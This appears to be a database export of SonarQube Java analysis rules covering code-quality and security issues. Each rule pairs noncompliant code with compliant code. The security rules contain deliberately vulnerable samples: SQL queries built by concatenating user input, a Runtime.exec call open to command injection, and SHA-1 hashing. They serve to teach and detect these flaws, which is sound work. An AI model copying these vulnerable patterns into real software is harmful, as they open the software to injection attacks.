href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe	f	HTML	1511453807030	1511453807031	3
510	"for" loop incrementers should modify the variable being tested in the loop's stop condition	S1994	S1994	squid	<p>It is almost always an error when a <code>for</code> loop's stop condition and incrementer don't act on the same variable. Even when it is not, it could confuse future maintainers of the code, and should be avoided.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (i = 0; i < 10; j++) {  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (i = 0; i < 10; i++) {\n  // ...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	suspicious	f	HTML	1511453807032	1511453807032	1
511	Default EJB interceptors should be declared in "ejb-jar.xml"	S3281	S3281	squid	<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated as default. </p>\n<p>This rule applies to projects that contain JEE Beans  (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>, <code>Stateless</code> or <code>Stateful</code>).</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// file: ejb-interceptors.xml\n&lt;assembly-descriptor&gt;\n &lt;interceptor-binding&gt;\n      &lt;ejb-name&gt;*&lt;/ejb-name&gt;\n      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;&lt;!-- Noncompliant; will not be treated as default --&gt;\n   &lt;/interceptor-binding&gt;\n&lt;/assembly-descriptor&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// file: ejb-jar.xml\n&lt;assembly-descriptor&gt;\n &lt;interceptor-binding&gt;\n      &lt;ejb-name&gt;*&lt;/ejb-name&gt;\n      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;\n   &lt;/interceptor-binding&gt;\n&lt;/assembly-descriptor&gt;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807033	1511453807034	2
514	"@NonNull" values should not be set to null	S2637	S2637	squid	<p>\nFields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have \nnon-null values and are not typically null-checked before use. Therefore setting one of these values to null, or failing to set \nsuch a class field in a constructor, could cause <code>NullPointerException</code>s at runtime.</p>\n\n<p>\nIt is quite likely that the code does not match the programmer's intent.\n</p>\n\n<h2>Noncompliant Code Examples</h2>\n\n<pre>\npublic class Fruit {\n  @NotNull\n  private Season ripe;\n\n  private String color;\n\n  public Fruit() {  // Noncompliant; ripe is left null\n  }\n\n  public void setColor(@NotNull String color) {\n    this.color = color;\n  }\n\n  public @NotNull Integer getProtein() {\n    return null;  // Noncompliant\n  }\n}\n\npublic class MyClass {\n\n  public void doSomething() {\n\n    Fruit fruit = new Fruit();\n    fruit.setColor(null);  // Noncompliant\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	misra	f	HTML	1511453807038	1511453807038	2
512	SHA-1 and Message-Digest hash algorithms should not be used	S2070	S2070	squid	<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is, it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2, MD4, MD6.</p>\n<p>This rule tracks usage of the <code>java.security.MessageDigest</code>, and <code>org.apache.commons.codec.digest.DigestUtils</code> classes  to instantiate MD or SHA-1 algorithms, and of Guava's <code>com.google.common.hash.Hashing sha1</code> and <code>md5</code> methods. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nMessageDigest md = MessageDigest.getInstance("SHA1");  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nMessageDigest md = MessageDigest.getInstance("SHA-256");\n</pre>\n<p>or</p>\n<pre>\nCipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#WEAK_MESSAGE_DIGEST">MessageDigest Is Weak</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a6,sans-top25-porous	f	HTML	1511453807035	1511453807036	3
513	EJB interceptor exclusions should be declared as annotations	S3282	S3282	squid	<p>Exclusions for default interceptors can be declared either in xml or as class annotations. Since annotations are more visible to maintainers, they are preferred.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;assembly-descriptor&gt;\n      &lt;interceptor-binding&gt;\n         &lt;ejb-name&gt;MyExcludedClass&lt;/ejb-name&gt;\n         &lt;exclude-default-interceptors&gt;true&lt;/exclude-default-interceptors&gt; &lt;!-- Noncompliant --&gt;\n         &lt;exclude-class-interceptors&gt;true&lt;/exclude-class-interceptors&gt; &lt;!-- Noncomopliant --&gt;\n         &lt;method&gt;\n           &lt;method-name&gt;doTheThing&lt;/method-name&gt;\n         &lt;/method&gt;\n      &lt;/interceptor-binding&gt;\n\n&lt;/assembly-descriptor&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n@ExcludeDefaultInterceptors\npublic class MyExcludedClass implements MessageListener\n{\n\n  @ExcludeClassInterceptors\n  @ExcludeDefaultInterceptors\n  public void doTheThing() {\n    // ...\n  }\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	pitfall	f	HTML	1511453807037	1511453807037	1
515	Inappropriate regular expressions should not be used	S2639	S2639	squid	<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>\n<p>The following should not be used as regular expressions:</p>\n<ul>\n<li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em>\n</li><li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters\n</li><li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character\n</li></ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = "/File|Name.txt";\n\nString clean = str.replaceAll(".",""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string\nString clean2 = str.replaceAll("|","_"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_\nString clean3 = str.replaceAll(File.separator,""); // Noncompliant; exception on Windows\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807039	1511453807040	2
516	Empty statements should be removed	EmptyStatementUsageCheck	EmptyStatementUsageCheck	squid	<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>\n<ul>\n<li> It was meant to be replaced by an actual statement, but this was forgotten.</li>\n<li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething() {\n  ;                                                       // Noncompliant - was used as a kind of TODO marker\n}\n\nvoid doSomethingElse() {\n  System.out.println("Hello, world!");;                     // Noncompliant - double ;\n  ...\n  for (int i = 0; i &lt; 3; System.out.println(i), i++);       // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething() {}\n\nvoid doSomethingElse() {\n  System.out.println("Hello, world!");\n  ...\n  for (int i = 0; i &lt; 3; i++){\n    System.out.println(i);\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that the first character following the null statement is a white-space character.</li>\n<li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided that the first character following the null statement is a white-space character.</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,misra,unused	f	HTML	1511453807042	1511453807043	1
517	Method overrides should not change contracts	S2638	S2638	squid	<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the superclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are marked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and <code>@Nonnull</code>, then subclass parameters are not allowed to tightened the contract, and return values are not allowed to loosen it.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n\n  private Season ripe;\n  private String color;\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n\npublic class Raspberry extends Fruit {\n\n  public void setRipe(@NotNull Season ripe) {  // Noncompliant\n    this.ripe = ripe;\n  }\n\n  public @Nullable Integer getProtein() {  // Noncompliant\n    return null;\n  }\n}\n</pre>\n\n<h2>See also</h2>\n<p>https://en.wikipedia.org/wiki/Liskov_substitution_principle</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	suspicious	f	HTML	1511453807044	1511453807045	1
519	Values passed to SQL commands should be sanitized	S2077	S2077	squid	<p>Applications that execute SQL commands should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input that changes the query so that unintended commands are executed, or sensitive data is exposed.</p>\n<p>This rule checks that method parameters are not used directly in non-Hibernate SQL statements, and that parameter binding, rather than concatenation is used in Hibernate statements.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  Statement stmt2 = null;\n  PreparedStatement pstmt;\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery("GETDATE()"); // Compliant; parameters not used here\n\n    stmt2 = con.createStatement();\n    ResultSet rs2 = stmt2.executeQuery("select FNAME, LNAME, SSN " +\n                 "from USERS where UNAME=" + user);  // Noncompliant; parameter concatenated directly into query\n\n    pstmt = con.prepareStatement("select FNAME, LNAME, SSN " +\n                 "from USERS where UNAME=" + user);  // Noncompliant; parameter concatenated directly into query\n    ResultSet rs3 = pstmt.executeQuery();\n\n    //...\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String userInput) {\n\n  org.hibernate.Query query = session.createQuery(  // Compliant\n            "FROM students where fname = " + userInput);  // Noncompliant; parameter binding should be used instead\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic User getUser(Connection con, String user) throws SQLException {\n\n  Statement stmt1 = null;\n  PreparedStatement pstmt = null;\n  String query = "select FNAME, LNAME, SSN " +\n                 "from USERS where UNAME=?"\n  try {\n    stmt1 = con.createStatement();\n    ResultSet rs1 = stmt1.executeQuery("GETDATE()");\n\n    pstmt = con.prepareStatement(query);\n    pstmt.setString(1, user);  // Compliant; PreparedStatements escape their inputs.\n    ResultSet rs2 = pstmt.executeQuery();\n\n    //...\n  }\n}\n\npublic User getUserHibernate(org.hibernate.Session session, String userInput) {\n\n  org.hibernate.Query query =  session.createQuery("FROM students where fname = ?");\n  query = query.setParameter(0,userInput);  // Parameter binding escapes all input\n  // ...\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/89">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/564.html">MITRE, CWE-564</a> - SQL Injection: Hibernate</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/20.html">MITRE, CWE-20</a> - Improper Input Validation</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/943.html">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Insecure Interaction Between Components</li>\n<li> Derived from FindSecBugs rules <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection (JPA)</a>, <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,hibernate,owasp-a1,sans-top25-insecure,sql	f	HTML	1511453807047	1511453807048	3
520	Values passed to OS commands should be sanitized	S2076	S2076	squid	<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands, or exposes sensitive data.</p>\n<p>This rule logs an issue as soon as a command is built dynamically. it's then up to the auditor to figure out if the command execution is secure or not. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void listContent(String input) {\n  Runtime rt = Runtime.getRuntime();\n  rt.exec("ls " + input); // Noncompliant; input could easily contain extra commands\n  ...\n}\n\npublic void execute(String command, String argument) {\n  ProcessBuilder pb = new ProcessBuilder(command, argument); // Noncompliant\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/78">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/88">MITRE, CWE-88</a> - Argument Injection or Modification</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Insecure Interaction Between Components</li>\n<li> Derived from the FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#COMMAND_INJECTION">Potential Command Injection</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a1,sans-top25-insecure	f	HTML	1511453807049	1511453807049	3
521	Modulus results should not be checked for direct equality	S2197	S2197	squid	When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for equality with a positive number (or a negative one) could result in false negatives. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isOdd(int x) {\n  return x % 2 == 1;  // Noncompliant; if x is negative, x % 2 == -1\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isOdd(int x) {\n  return x %2 != 0;\n}\n</pre>\n\nor\n\n<pre>\npublic boolean isOdd(int x) {\n  return Math.abs(x %2) != 1;\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807050	1511453807050	2
524	"switch" statements should have at least 3 "case" clauses	S1301	S1301	squid	<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>\n<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nswitch (variable) {\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (variable == 0) {\n  doSomething();\n} else {\n  doSomethingElse();\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause.</li>\n<li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause.</li>\n<li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses</li>\n</ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra	f	HTML	1511453807052	1511453807053	1
525	Magic numbers should not be used	S109	S109	squid	<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the number of iterations of a loops, to test the value of a property, etc.</p>\n\n<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at debugging time.</p>\n\n<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>\n<p>-1, 0 and 1 are not considered magic numbers (by default, configurable).</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void doSomething() {\n  for(int i = 0; i &lt; 4; i++){                 // Noncompliant, 4 is a magic number\n    ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static final int NUMBER_OF_CYCLES = 4;\npublic static void doSomething() {\n  for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++){\n    ...\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	brain-overload	f	HTML	1511453807055	1511453807055	1
526	Standard outputs should not be used directly to log anything	S106	S106	squid	<p>When logging a message there are two important requirements which must be fulfilled:</p>\n<ul>\n  <li> The user must be able to easily retrieve the logs</li>\n  <li> The format of all logged message must be uniform to allow the user to easily read the log</li>\n</ul>\n\n<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That's why defining and using a dedicated logger is highly recommended.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nSystem.out.println("My Message");  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nlogger.log("My Message");\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453807056	1511453807057	1
527	"Externalizable" classes should have a no-arguments constructor	S2060	S2060	squid	<p>An <code>Externalizable</code> class is one which handles its own <code>Serialization</code> and deserialization. During deserialization, the first step in the process is a default instantiation using the class' no-argument constructor. Therefore an <code>Externalizable</code> class without a no-arg constructor cannot be deserialized.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Tomato implements Externalizable {  // Noncompliant; no no-arg constructor\n\n  public Tomato (String color, int weight) { ... }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Tomato implements Externalizable {\n\n  public Tomato() { ... }\n  public Tomato (String color, int weight) { ... }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807057	1511453807058	2
530	Custom serialization method signatures should meet requirements	S2061	S2061	squid	Writers of <code>Serializable</code> classes can choose to let Java's automatic mechanisms handle serialization and deserialization, or they can choose to handle it themselves by implementing specific methods. However, if the signatures of those methods are not exactly what is expected, they will be ignored and the default serialization mechanisms will kick back in. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Watermelon implements Serializable {\n  // ...\n  void writeObject(java.io.ObjectOutputStream out)// Noncompliant; not private\n        throws IOException  \n  {...}\n\n  private void readObject(java.io.ObjectInputStream in)\n  {...}\n\n  public void readObjectNoData()  // Noncompliant; not private \n  {...}\n\n  static Object readResolve() throws ObjectStreamException  // Noncompliant; this method may have any access modifier, may not be static\n\n  Watermelon writeReplace() throws ObjectStreamException // Noncompliant; this method may have any access modifier, but must return Object\n  {...}\n} \n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Watermelon implements Serializable {\n  // ...\n  private void writeObject(java.io.ObjectOutputStream out) \n        throws IOException \n  {...}\n\n  private void readObject(java.io.ObjectInputStream in)\n        throws IOException, ClassNotFoundException\n  {...}\n\n  private void readObjectNoData()\n        throws ObjectStreamException\n  {...}\n\n  protected Object readResolve() throws ObjectStreamException\n  {...}\n\n  private Object writeReplace() throws ObjectStreamException\n  {...}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807059	1511453807060	2
531	Silly math should not be performed	S2185	S2185	squid	<p>Certain math operations are just silly and should not be performed because their results are predictable.</p>\n<p>In particular, <code>anyValue % 1</code> is silly because it will always return 0.</p>\n<p>Casting a non-floating-point value to floating-point and then passing it to <code>Math.round</code>, <code>Math.ceil</code>, or <code>Math.floor</code> is silly  because the result will always be the original value. </p>\n<p>These operations are silly with any constant value: <code>Math.abs</code>, <code>Math.ceil</code>, <code>Math.floor</code>, <code>Math.rint</code>, <code>Math.round</code>.</p>\n<p>And these oprations are silly with certain constant values:</p>\n<table>\n<tr><th>Operation</th><th>Value</th></tr>\n<tr><td>acos</td><td>0.0 or 1.0</td></tr>\n<tr><td>asin</td><td>0.0 or 1.0</td></tr>\n<tr><td>atan</td><td>0.0 or 1.0</td></tr>\n<tr><td>atan2</td><td>0.0</td></tr>\n<tr><td>cbrt</td><td>0.0 or 1.0</td></tr>\n<tr><td>cos</td><td>0.0</td></tr>\n<tr><td>cosh</td><td>0.0</td></tr>\n<tr><td>exp</td><td>0.0 or 1.0</td></tr>\n<tr><td>expm1</td><td>0.0</td></tr>\n<tr><td>log</td><td>0.0 or 1.0</td></tr>\n<tr><td>log10</td><td>0.0 or 1.0</td></tr>\n<tr><td>sin</td><td>0.0</td></tr>\n<tr><td>sinh</td><td>0.0</td></tr>\n<tr><td>sqrt</td><td>0.0 or 1.0</td></tr>\n<tr><td>tan</td><td>0.0</td></tr>\n<tr><td>tanh</td><td>0.0</td></tr>\n<tr><td>toDegrees</td><td>0.0 or 1.0</td></tr>\n<tr><td>toRadians</td><td>0.0</td></tr>\n</table>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void doMath(int a)\ndouble floor = Math.floor((double)a); // Noncompliant\ndouble ceiling = Math.ceil(4.2);\ndouble arcTan = Math.atan(0.0);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	clumsy	f	HTML	1511453807060	1511453807061	1
532	Math operands should be cast before assignment	S2184	S2184	squid	<p>When arithmetic is performed on <code>int</code>s, the result will always be an <code>int</code>. You can assign that result to a <code>long</code>, <code>double</code>, or <code>float</code> with automatic type conversion, but having started as an <code>int</code>, the result will likely not be what you expect. </p>\n<p>For instance, if the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost before the assignment. Likewise, if the result of multiplication is assigned to a <code>long</code>, it may have already overflowed before the assignment.</p>\n<p>In either case, the result will not be what was expected. Instead, at least one operand should be cast or promoted to the final type before the operation takes place.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfloat twoThirds = 2/3; // Noncompliant; int division. Yields 0.0\nlong millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928\nlong bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647\nlong bigNegNum =  Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one. \nDate myDate = new Date(seconds * 1_000); //Noncompliant, won't produce the expected result if seconds &gt; 2_147_483\n...\npublic long compute(int factor){\n  return factor * 10_000;  //Noncompliant, won't produce the expected result if factor &gt; 214_748\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfloat twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667\nlong millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000\nlong bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649\nlong bigNegNum =  Integer.MIN_VALUE-1L; // Yields -2_147_483_649\nDate myDate = new Date(seconds * 1_000L);\n...\npublic long compute(int factor){\n  return factor * 10_000L;\n}\n</pre>\n<p>or</p>\n<pre>\nfloat twoThirds = (float)2/3; // 2 cast to float\nlong millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long\nlong bigNum = (long)Integer.MAX_VALUE + 2;\nlong bigNegNum =  (long)Integer.MIN_VALUE-1;\nDate myDate = new Date((long)seconds * 1_000);\n...\npublic long compute(long factor){\n  return factor * 10_000;\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/190">MITRE, CWE-190</a> - Integer Overflow or Wraparound</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Risky Resource Management</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,sans-top25-risky	f	HTML	1511453807061	1511453807062	2
533	Comparators should be "Serializable"	S2063	S2063	squid	A non-serializable <code>Comparator</code> can prevent an otherwise-<code>Serializable</code> ordered collection from being serializable. Since the overhead to make a <code>Comparator</code> serializable is usually low, doing so can be considered good defensive programming.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FruitComparator implements Comparator&lt;Fruit&gt; {  // Noncompliant\n  int compare(Fruit f1, Fruit f2) {...}\n  boolean equals(Object obj) {...}\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class FruitComparator implements Comparator&lt;Fruit&gt;, Serializable {\n  private static final long serialVersionUID = 1;\n\n  int compare(Fruit f1, Fruit f2) {...}\n  boolean equals(Object obj) {...}\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall,serialization	f	HTML	1511453807062	1511453807063	1
534	Variables should not be self-assigned	S1656	S1656	squid	<p>\n  There is no reason to re-assign a variable to itself.\n  Either this statement is redundant and should be removed,\n  or the re-assignment is a mistake and some other value or variable was intended for the assignment instead.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void setName(String name) {\n  name = name;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void setName(String name) {\n  this.name = name;\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	3min	\N	\N	cert	f	HTML	1511453807063	1511453807063	2
535	Java parser failure	ParsingError	ParsingError	squid	<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number of files that do not parse but also to easily find out why they do not parse.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	suspicious	f	HTML	1511453807064	1511453807064	1
539	Raw byte values should not be used in bitwise operations in combination with shifts	S3034	S3034	squid	<p>When reading bytes in order to build other primitive values such as <code>int</code>s or <code>long</code>s, the <code>byte</code> values are automatically promoted, but that promotion can have unexpected results.</p>\n<p>For instance, the binary representation of the integer 640 is <code>0b0000_0010_1000_0000</code>, which can also be written with the array of (unsigned) bytes <code>[2, 128]</code>. However, since Java uses two's complement, the representation of the integer in signed bytes will be <code>[2, -128]</code>  (because the <code>byte</code> <code>0b1000_0000</code> is promoted to the <code>int</code> <code>0b1111_1111_1111_1111_1111_1111_1000_0000</code>). Consequently, trying to reconstruct the initial integer by shifting and adding the values of the bytes without taking care of the sign will not produce the expected result.  </p>\n<p>To prevent such accidental value conversion, use bitwise and (<code>&amp;</code>) to combine the <code>byte</code> value with <code>0xff</code> (255) and turn all the higher bits back off.</p>\n<p>This rule raises an issue any time a <code>byte</code> value is used as an operand without <code>&amp; 0xff</code>, when combined with shifts.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n  int intFromBuffer() {\n    int result = 0;\n    for (int i = 0; i &lt; 4; i++) {\n      result = (result &lt;&lt; 8) | readByte(); // Noncompliant\n    }\n    return result;\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n  int intFromBuffer() {\n    int result = 0;\n    for (int i = 0; i &lt; 4; i++) {\n      result = (result &lt;&lt; 8) | (readByte() &amp; 0xff);\n    }\n    return result;\n  }\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807067	1511453807068	2
